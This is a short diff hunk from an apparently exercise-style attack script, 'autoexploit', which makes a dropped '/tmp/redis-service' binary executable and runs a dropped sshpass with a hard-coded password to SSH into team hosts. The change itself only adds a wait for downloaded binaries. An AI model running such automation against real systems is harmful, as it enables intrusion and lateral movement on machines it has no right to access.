@@ -167,6 +167,8 @@ def autoexploit(remote, team):
     out = remote.shell_cmd("chmod +x /tmp/redis-service")
     print(out)
 
+    sleep(5) # Waiting for the tmp binaries to be downloaded
+    
     # Failed login
     out = remote.shell_cmd(f"/tmp/sshpass -p '&pV5)f*_^1' /tmp/ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.100")
     print(out)
